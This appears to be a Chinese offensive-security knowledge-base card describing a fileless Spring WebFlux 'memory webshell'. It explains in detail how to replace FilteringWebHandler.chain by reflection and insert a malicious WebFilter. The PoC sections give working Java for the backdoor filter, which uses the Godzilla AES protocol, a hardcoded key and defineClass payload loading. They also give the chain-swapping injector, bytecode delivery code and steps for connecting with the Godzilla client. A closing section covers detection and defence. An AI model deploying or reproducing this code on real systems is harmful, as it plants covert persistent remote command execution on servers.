---
id: web-java-framework-spring-webflux-filteringwebhandler-memshell
title: Spring WebFlux 内存马：替换 FilteringWebHandler.chain 注入恶意 WebFilter
type: scenario
domain: web
path: web/java/framework/spring
technique: webflux-filteringwebhandler-chain-memshell
tags:
- java
- spring
- webflux
- memshell
- webfilter
- defineclass
- godzilla
- persistence
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V19
  verified_at: '2026-11-05T02:14:18+08:00'
  notes: 已对照原文与14张图核对；DefaultWebFilterChain递归链、FilteringWebHandler.chain替换、final反射修改、EvilFilter哥斯拉AES协议与Success!截图均一致；属已获代码执行后的持久化手法非独立漏洞；未复跑，对象遍历路径依赖Spring Boot 2.6.13+Netty
url: /docs/web/java/framework/spring/web-java-framework-spring-webflux-filteringwebhandler-memshell/
draft: false
kb_aliases:
- WebFlux 内存马
- FilteringWebHandler 内存马
- DefaultWebFilterChain 注入
- 恶意 WebFilter
- 哥斯拉 WebFlux 内存马
- 无文件 WebFlux WebShell
---

## 一句话结论

Spring WebFlux 没有 Servlet Filter/Listener/Interceptor，请求过滤由 `FilteringWebHandler` 持有的 `DefaultWebFilterChain` 完成；该 chain 是一个递归链，每层持有 `currentFilter` 和下一层 `chain`。在已能执行 Java 代码的前提下，遍历当前线程对象图拿到 `FilteringWebHandler`，反射读取它的 `chain` 和原始 `handler`/filters，构造一个把恶意 `WebFilter` 放在首位的新 `DefaultWebFilterChain`，再把 `FilteringWebHandler.chain` 替换掉，即可形成无文件、重启前持久的内存 WebShell；恶意过滤器再按哥斯拉 JavaDynamicPayload/JAVA_AES_BASE64 协议解密执行命令。

## 原理

- **WebFlux 过滤模型**：WebFilter 通过 `filter(ServerWebExchange, WebFilterChain)` 组成责任链；`FilteringWebHandler` 是链的持有者：
  ```java
  public class FilteringWebHandler extends WebHandlerDecorator {
      private final DefaultWebFilterChain chain;
      public FilteringWebHandler(WebHandler handler, List<WebFilter> filters) {
          super(handler);
          this.chain = new DefaultWebFilterChain(handler, filters);
      }
  }
  ```
- **DefaultWebFilterChain 是递归链**：公有构造函数 `DefaultWebFilterChain(WebHandler handler, List<WebFilter> filters)` 内部 `initChain` 生成 `currentFilter` 和 `chain`（下一层），`filter()` 调用当前 filter 后由其继续调用 `chain.filter()`。想插入过滤器不能只改 `allFilters`，需要新建一个 chain 节点并把 `FilteringWebHandler.chain` 指向它。
- **对象图定位**：从当前线程的 `ThreadGroup`/`threads` 出发，按 Spring Boot + Netty 的持有关系向上遍历：
  ```text
  Thread
   → this$0: org.springframework.boot.web.embedded.netty.NettyWebServer$1
   → handler: ReactorHttpHandlerAdapter
   → httpHandler: WebServerManager$DelayedInitializationHttpHandler
   → delegate: HttpWebHandlerAdapter
   → delegate: ExceptionHandlingWebHandler
   → delegate: FilteringWebHandler
   → chain: DefaultWebFilterChain
  ```
  该路径依赖 Spring Boot/Netty 的字段名与层级，版本变化时需重新定位；也可用 java-object-searcher 等工具按类型搜索 `FilteringWebHandler`/`DefaultWebFilterChain`。
- **替换 chain**：
  1. 取 `DefaultWebFilterChain` 的 `handler`（WebHandler）和 `getFilters()`；
  2. 复制成可变 `ArrayList`，把恶意 WebFilter 插到索引 0（最高优先级）；
  3. `new DefaultWebFilterChain(handler, list)` 生成新链；
  4. 反射拿到 `FilteringWebHandler.chain`（`private final`），临时清除 `Field.modifiers` 的 `FINAL` 位后 `set` 新链，再恢复 final 标志。
- **恶意 WebFilter 的工作方式**：检查特定请求头（如 `cmisl: cmisl`），读取表单参数 `password`，Base64 解码后用 AES 解密；首次请求把解密出的字节码通过 `ClassLoader#defineClass` 定义为 payload 类并缓存；后续请求实例化 payload，按哥斯拉约定调用 `equals(ByteArrayOutputStream)`/`equals(data)` 执行模块逻辑，再把输出 AES 加密 + Base64，并拼接 MD5 左右缀返回。
- **为什么无文件**：恶意类由 `defineClass` 直接定义在内存（可用 `URLClassLoader` 或目标 ClassLoader），不落盘；过滤器链对象也是运行时构造。JSP/class 文件查杀看不到，但进程重启后消失。
- **与 Spring MVC 内存马的区别**：MVC 是注册 `RequestMappingHandlerMapping` 路由；WebFlux 是替换 `FilteringWebHandler.chain`，入口在过滤器层，所有请求都会先经过恶意过滤器，不依赖路由匹配。

## 触发条件

- 目标为 Spring WebFlux（Reactor Netty）应用，classpath 包含 `spring-web`/`spring-webflux`；原文环境为 Spring Boot 2.6.13、spring-web 5.3.23、JDK 8。
- 攻击者已获得在目标 JVM 内执行 Java 代码的能力（反序列化、SpEL/OGNL、模板注入、任意文件写入+类加载等）。
- 注入器能在请求线程或应用线程中运行，能访问 `Thread.currentThread()` 与上下文 ClassLoader。
- Java 版本允许反射修改 `Field.modifiers`（JDK 8/11 常见；JDK 17+ 受模块封装限制，需要 `--add-opens` 或其它方式）。
- 目标未部署针对 `defineClass`/`FilteringWebHandler.chain` 修改的 RASP 检测。

## 利用步骤

1. 编译恶意 `WebFilter` 类（含 AES/Base64 解密、`defineClass`、哥斯拉 payload 调用逻辑），将 class 文件 gzip 压缩后 Base64 编码，嵌入注入器。
2. 注入器从当前线程对象图定位 `FilteringWebHandler`：
   - 取 `Thread.getAllStackTraces`/`Thread.class.getDeclaredMethod("getThreads")` 的线程数组；
   - 逐层 `getFV(obj, "this$0"/"handler"/"httpHandler"/"delegate")` 直到 `FilteringWebHandler`。
3. 取 `FilteringWebHandler.chain`，读取其 `handler` 和 `getFilters()`。
4. 新建 `ArrayList` 并 `add(0, evilWebFilter)`；用 `new DefaultWebFilterChain(handler, list)` 构造新链。
5. 反射清除 `FilteringWebHandler.chain` 的 `final` 修饰并赋值新链，随后恢复。
6. 用哥斯拉客户端连接目标 URL，加密器选 `JAVA_AES_BASE64`，载荷 `JavaDynamicPayload`，密码/密钥/请求头与恶意过滤器内一致（原文 `cmisl`/`cmisl`，header `cmisl: cmisl`）。
7. 首次请求投递 payload 字节码（`defineClass`），第二次 `test` 返回成功，之后即可执行命令/文件操作等模块。

## PoC

恶意过滤器核心（省略 imports）：

```java
public class EvilFilter implements WebFilter {
    public static Map<String, Object> store = new HashMap();
    String xc = "082e34fbef497bb1";   // AES key
    String pass = "cmisl";             // 表单参数名
    String headerName = "cmisl";
    String headerValue = "cmisl";
    String md5 = md5(pass + xc);

    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        if (exchange.getRequest().getHeaders().getFirst(headerName) == null
            || !exchange.getRequest().getHeaders().getFirst(headerName).contains(headerValue)) {
            return chain.filter(exchange);
        }
        Object bufferStream = exchange.getFormData().flatMap(c -> {
            StringBuilder result = new StringBuilder();
            try {
                byte[] data = x(base64Decode(c.getFirst(pass)), false);
                if (store.get("payload") == null) {
                    store.put("payload", defineClass(data));   // 第一阶段：定义 payload 类
                } else {
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                    Object f = ((Class) store.get("payload")).newInstance();
                    f.equals(arrOut);                           // 哥斯拉约定：输出写到 arrOut
                    f.equals(data);                             // 执行本次模块
                    result.append(md5.substring(0, 16));
                    f.toString();
                    result.append(base64Encode(x(arrOut.toByteArray(), true)));
                    result.append(md5.substring(16));
                }
            } catch (Exception ex) { result.append(ex.getMessage()); }
            return Mono.just(new DefaultDataBufferFactory().wrap(result.toString().getBytes(StandardCharsets.UTF_8)));
        });
        return exchange.getResponse().writeWith((Mono<DefaultDataBuffer>) bufferStream);
    }
}
```

注入器关键逻辑：

```java
Object filteringWebHandler = getFV(getFV(getFV(getFV(getFV(getFV(
    thread, "this$0"), "handler"), "httpHandler"), "delegate"), "delegate"), "delegate");

Object chain = getFV(filteringWebHandler, "chain");
Object handler = getFV(chain, "handler");
List<WebFilter> filters = new ArrayList<>(((DefaultWebFilterChain) chain).getFilters());
filters.add(0, (WebFilter) evilFilter);

DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, filters);
Field chainField = filteringWebHandler.getClass().getDeclaredField("chain");
chainField.setAccessible(true);
Field modifiers = Field.class.getDeclaredField("modifiers");
modifiers.setAccessible(true);
modifiers.setInt(chainField, chainField.getModifiers() & ~Modifier.FINAL);
chainField.set(filteringWebHandler, newChain);
modifiers.setInt(chainField, chainField.getModifiers() | Modifier.FINAL);
```

恶意过滤器字节码投递：

```java
byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
defineClass.setAccessible(true);
Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), clazzByte, 0, clazzByte.length);
WebFilter evil = (WebFilter) clazz.newInstance();
```

说明：原文将 `EvilFilter` 编译后 gzip + Base64 嵌入注入器的 `getBase64String()`；使用哥斯拉客户端连接后返回 `Success!`。PoC 未在本机复跑，字段遍历路径依赖 Spring Boot 2.6.13 + Netty。

## 变体与关联

- **定位方式变体**：不依赖固定的 `this$0→handler→httpHandler→delegate` 路径，可用 java-object-searcher 按 `FilteringWebHandler`/`DefaultWebFilterChain` 类型 BFS 搜索；或从 `WebServerManager`/`HttpWebHandlerAdapter` 的静态引用入手。
- **注入点变体**：替换 `ExceptionHandlingWebHandler.delegate`、`HttpWebHandlerAdapter.delegate`，或注册 `HandlerFilterFunction`；Spring Cloud Gateway 可注入全局 `GlobalFilter`；Netty 层可向 ChannelPipeline 添加 handler。
- **链构造变体**：不新建 chain，也可反射修改现有 `DefaultWebFilterChain.currentFilter`/`chain` 节点，但递归链结构容易破坏后续过滤器，推荐重建整条链。
- **协议变体**：恶意过滤器可换成冰蝎/蚁剑/自定义 AES 协议；核心是“入口过滤器 + defineClass + 加密回显”。
- **与 Spring MVC 内存马卡的关系**：`web-java-framework-spring-mvc-dynamic-controller-memshell` 是 MVC 路由注册；本卡是 WebFlux 过滤器链替换，适用框架与注入点不同。
- **JDK 17+**：`Field.modifiers` 修改受模块封装限制，需 `--add-opens java.base/java.lang.reflect=ALL-UNNAMED` 或使用 `Unsafe`/`VarHandle`；也可改用 `FilteringWebHandler` 的可变替换点（若版本提供）。

## 检测与防御

- 运行时检测：`FilteringWebHandler.chain` 的 `allFilters` 中出现非应用 JAR 来源、无 `CodeSource` 或由 `defineClass` 定义的类；`DefaultWebFilterChain` 被替换为新实例；`Field.modifiers` 被修改以清除 final。
- 监控 `ClassLoader#defineClass`、`URLClassLoader` 动态定义、gzip+Base64 大块数据；RASP 对 `FilteringWebHandler`/`DefaultWebFilterChain` 的反射写入告警。
- 流量检测：哥斯拉 `JAVA_AES_BASE64` 特征（固定 MD5 左右缀、AES 密文表单参数、`test` 请求）、异常请求头与表单组合。
- 防御：禁止/限制反射修改 final 字段（JDK 17+ 强封装、`--illegal-access=deny`）；部署 RASP/Java Agent 做类与过滤器链完整性校验；限制反序列化/表达式注入入口；对内存马家族做专项扫描（arthas、copagent、java-memshell-scanner 等）。
- 审计：搜索 `ClassLoader#defineClass`、`FilteringWebHandler`、`DefaultWebFilterChain` 的可达性；检查是否存在可利用的任意代码执行入口。
